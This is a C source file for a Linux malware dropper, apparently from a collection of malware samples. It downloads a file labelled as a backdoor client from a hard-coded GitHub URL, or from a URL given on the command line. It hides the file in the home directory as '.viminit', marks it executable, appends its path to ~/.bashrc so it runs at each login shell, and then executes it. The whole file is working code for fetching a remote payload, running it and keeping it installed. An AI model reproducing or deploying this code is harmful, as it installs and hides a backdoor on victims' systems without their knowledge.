#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <unistd.h>

#define PERM_755 (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH)
#define BUFSIZE 1024

// malware url
char const* malwareAt = "https://github.com/tiencong283/ways-to-malware/raw/master/backdoor/linux/client";
char* fileName = NULL;
char const* hiddenName = ".viminit"; 
char hiddenPath[BUFSIZE];

int doPersistence(){
	char const* homeAt = getenv("HOME");
	char bashProfileAt[BUFSIZE];
	char command[BUFSIZE];
	
	sprintf(bashProfileAt, "%s/%s", homeAt, "/.bashrc");
	sprintf(hiddenPath, "%s/%s", homeAt, hiddenName);
	sprintf(command, "%s\n", hiddenPath);

	if (rename(fileName, hiddenPath) == -1){
		return 1;
	}
	if (chmod(hiddenPath, PERM_755) == -1){
		return 1;
	}
	FILE* s = fopen(bashProfileAt, "a");
	if (s == NULL){
		return 1;
	}
	if (fwrite(command, 1, strlen(command), s) == 0 && ferror(s)){
		return 1;
	}
	fclose(s);
	return 0;
}

// return filename in form "https://.../filename"
char* getFileName(char const* url){
	if (url == NULL || strlen(url) == 0){
		return NULL;
	}
	int slashAt = strlen(url) - 1;
	while (slashAt >=0 && url[slashAt] != '/'){
		slashAt -= 1;
	}
	if (slashAt < 0)
		return NULL;
	return strdup(&url[slashAt + 1]);
}

// callback for writing received data
// called many times and each invoke delivers another chunk of data
// it's guaranteed that size >= 1, or zero bytes if downloaded file is empty
size_t saveToLocal(char *ptr, size_t size, size_t nmemb, void *userdata){
	FILE* stream = (FILE*)userdata;
	int nwrite = fwrite(ptr, size, nmemb, stream);
	fflush(stream);
	return nwrite;
}

int main(int argc, char** argv)
{	// easy handle ~ a session of transfer
	CURL* curl;
	char const* url;
	CURLcode res;
	FILE* stream;

	if (argc != 2){
		url = malwareAt;
	} else {
		url = argv[1];
	}

	if ((fileName=getFileName(url)) == NULL){
		fprintf(stderr, "ERROR: invalid URL\n");
		return 1;
	}
	
	if ((stream = fopen(fileName, "wb+")) == NULL){
		perror("fopen");	
		return 1;
	}

	// initialize the lib with all features enabled
	if (curl_global_init(CURL_GLOBAL_ALL)){
		fprintf(stderr, "ERROR: cannot init curl lib\n");
		return 1;
	}
	curl = curl_easy_init();
	if (curl == NULL){
		fprintf(stderr, "ERROR: cannot get curl handle\n");
		return 1;
	}
	// setup request
	// URL
	curl_easy_setopt(curl, CURLOPT_URL, url);	
	curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);	
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, saveToLocal);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, stream);
	
	// perform actual request
	res = curl_easy_perform(curl);
	
	// close all connections curl handle has used
	curl_easy_cleanup(curl);
	// cleanup the resources the curl_global_init call initialized
	curl_global_cleanup();
	
	if (res != CURLE_OK){
		fprintf(stderr, "ERROR: curl_easy_perform: %s\n", curl_easy_strerror(res));
		return 1;
	} 
	if (doPersistence() != 0){
		fprintf(stderr, "ERROR: failed in persistence phase\n");
		free(fileName);
		return 1;
	}	

	// start downloaded ELF
	int magic = 0;
	fseek(stream, 0, SEEK_SET);
	fread(&magic, 4, 1, stream);
	if (ferror(stream) || (magic!=0x464c457f)){
		fprintf(stderr, "ERROR: not ELF file\n");
		return 1;
	}
	fclose(stream);
	execl(hiddenPath, hiddenName, NULL);
	return 1;	// failed if reach here 
}
